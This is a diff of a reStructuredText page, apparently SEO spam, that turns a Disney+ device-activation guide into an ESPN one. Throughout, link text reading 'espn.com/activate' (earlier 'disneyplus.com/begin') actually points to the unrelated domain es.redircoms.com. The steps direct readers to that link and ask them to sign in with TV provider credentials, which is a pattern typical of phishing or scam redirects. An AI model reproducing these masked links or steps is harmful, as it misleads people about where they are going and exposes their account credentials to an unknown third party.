@@ -1,9 +1,9 @@
 ##################
-How to Activate Disney+ on My Device via disneyplus.com/begin
+How to Activate ESPN on Any Device via ESPN.com/activate
 ##################
 
 .. meta::
-   :msvalidate.01: 79062439FF46DE4F09274CF8F25244E0
+   :msvalidate.01: FE216E19E94441856C00D18618ACAE7D
 
 .. image:: blank.png
    :width: 350px
@@ -14,35 +14,46 @@ How to Activate Disney+ on My Device via disneyplus.com/begin
    :width: 350px
    :align: center
    :height: 100px
-   :alt: disneyplus.com/begin
-   :target: https://dis.redircoms.com
+   :alt: espn.com/activate
+   :target: https://es.redircoms.com
 
 .. image:: blank.png
    :width: 350px
    :align: center
    :height: 100px
 
-To start watching your favorite movies, TV shows, and originals from Disney, Pixar, Marvel, Star Wars, and National Geographic, activate your device at `disneyplus.com/begin <https://dis.redircoms.com>`_. This activation page ensures a secure and fast way to link your streaming device to your Disney+ account. Just enter the 8-digit code from your screen to begin streaming in minutes.
+Want to catch live sports, exclusive ESPN shows, and on-demand replays on your favorite screen? Activate your device effortlessly by visiting  
+`espn.com/activate <https://es.redircoms.com>`_ and using the code displayed on your TV. Follow the instructions below to get started.
 
 **********
-Steps to Activate Disney+ on Your Device
+How to Activate ESPN on Your Device
 **********
 
-1. Launch the Disney+ app on your smart TV, streaming stick, gaming console, or other device.
-2. On the welcome screen, an **8-digit activation code** will be displayed.
-3. Open a web browser on your computer or mobile device and go to `disneyplus.com/begin <https://dis.redircoms.com>`_.
-4. Log in using your Disney+ account credentials.
-5. Enter the **8-digit code** shown on your TV/device screen.
-6. Click **Continue** and wait for the device to link successfully.
+1. Launch the **ESPN app** on your Smart TV, Roku, Fire TV, Apple TV, or game console.
+2. Choose **Log In** or go to **Settings > Account Information**.
+3. A unique **activation code** will appear on the screen.
+4. On your phone, tablet, or computer, visit  
+   `espn.com/activate <https://es.redircoms.com>`_.
+5. Enter the activation code and click **Continue**.
+6. Sign in with your **TV provider login** credentials.
+7. Your screen will refresh, and ESPN content will be ready to stream.
 
 **********
-What to Do After Activation
+What You’ll Need
 **********
 
-1. Once activation is complete, your device will automatically refresh.
-2. You will now have full access to Disney+ content on your device.
-3. If the code expires, restart the app to generate a new code.
-4. For issues, ensure your device is connected to the internet and try again.
-5. You can repeat this process on additional devices using the same account.
+- A supported streaming device or smart TV  
+- A subscription with a participating TV provider  
+- Your TV provider username and password  
+- The activation code from the ESPN app  
 
-Start streaming the magic of Disney+ today by visiting `disneyplus.com/begin <https://dis.redircoms.com>`_ and entering your activation code.
+**********
+Tips for a Smooth Activation
+**********
+
+- If your activation code expires, reopen the ESPN app to get a new one.  
+- Confirm your TV provider includes ESPN in your plan.  
+- Use an up-to-date web browser for best compatibility.
+
+To start watching right away, go to  
+`espn.com/activate <https://es.redircoms.com>`_ and link your device with ease.
